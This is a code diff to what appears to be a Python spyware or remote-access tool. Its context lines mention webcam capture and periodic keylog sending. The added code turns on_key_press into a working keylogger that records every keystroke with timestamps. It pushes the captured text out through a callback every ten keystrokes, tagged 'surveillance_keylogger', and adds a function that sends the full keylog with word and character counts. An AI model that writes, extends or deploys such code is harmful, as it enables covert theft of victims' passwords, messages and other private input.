@@ -135,21 +135,51 @@ def capture_webcam(timeout=5):
         }
 
 def on_key_press(key):
-    """Callback for key press events"""
-    global captured_keys
+    """Handle key press events"""
+    global captured_keys, keylogger_running
+    if not keylogger_running:
+        return
+    
     try:
-        key_str = str(key.char)
-    except AttributeError:
-        key_str = str(key)
-    
-    captured_keys.append({
-        'key': key_str,
-        'timestamp': datetime.now().isoformat()
-    })
-    
-    # Limit buffer size
-    if len(captured_keys) > MAX_KEYLOG_BUFFER:
-        captured_keys = captured_keys[-MAX_KEYLOG_BUFFER:]
+        # Convert key to string representation
+        if hasattr(key, 'char') and key.char:
+            key_char = key.char
+        elif hasattr(key, 'name'):
+            key_char = f"[{key.name.upper()}]"
+        else:
+            key_char = str(key)
+        
+        # Add timestamp and metadata
+        key_data = {
+            'key': key_char,
+            'timestamp': datetime.now().isoformat(),
+            'raw_key': str(key)
+        }
+        
+        captured_keys.append(key_data)
+        logging.debug(f"Key captured: {key_char}")
+        
+        # Limit buffer size
+        if len(captured_keys) > MAX_KEYLOG_BUFFER:
+            captured_keys = captured_keys[-MAX_KEYLOG_BUFFER:]
+            
+        # Send data immediately if callback exists (for real-time monitoring)
+        if keylog_send_callback and len(captured_keys) % 10 == 0:  # Send every 10 keystrokes
+            try:
+                current_text = ''.join([k['key'] for k in captured_keys])
+                keylog_send_callback({
+                    'status': 'success',
+                    'message': 'Real-time keylog update',
+                    'captured_keys': captured_keys.copy(),
+                    'text': current_text,
+                    'timestamp': datetime.now().isoformat(),
+                    'type': 'surveillance_keylogger'
+                })
+            except Exception as e:
+                logging.error(f"Error sending real-time keylog: {e}")
+                
+    except Exception as e:
+        logging.error(f"Error processing key press: {e}")
 
 # Periodically send keylog data
 def periodic_keylog_send(interval=30):
@@ -277,6 +307,57 @@ def get_current_keylogger_text():
         return {
             'status': 'error',
             'message': 'Keylogger not running',
+            'timestamp': datetime.now().isoformat()
+        }
+
+def send_current_keylog_data():
+    """Manually send current keylog data"""
+    global captured_keys, keylog_send_callback
+    if not keylogger_running:
+        return {
+            'status': 'error',
+            'message': 'Keylogger not running',
+            'timestamp': datetime.now().isoformat()
+        }
+    
+    if not captured_keys:
+        return {
+            'status': 'success',
+            'message': 'No keys captured yet',
+            'captured_keys': [],
+            'text': '',
+            'timestamp': datetime.now().isoformat(),
+            'type': 'surveillance_keylogger'
+        }
+    
+    try:
+        # Build text from captured keys
+        current_text = ''.join([k['key'] for k in captured_keys])
+        word_count = len([word for word in current_text.split() if word.strip()])
+        character_count = len(current_text)
+        
+        result = {
+            'status': 'success',
+            'message': 'Current keylog data sent',
+            'captured_keys': captured_keys.copy(),
+            'text': current_text,
+            'word_count': word_count,
+            'character_count': character_count,
+            'timestamp': datetime.now().isoformat(),
+            'type': 'surveillance_keylogger'
+        }
+        
+        # Send via callback if available
+        if keylog_send_callback:
+            keylog_send_callback(result)
+        
+        return result
+        
+    except Exception as e:
+        logging.error(f"Error sending current keylog data: {e}")
+        return {
+            'status': 'error',
+            'error': str(e),
             'timestamp': datetime.now().isoformat()
         }
 
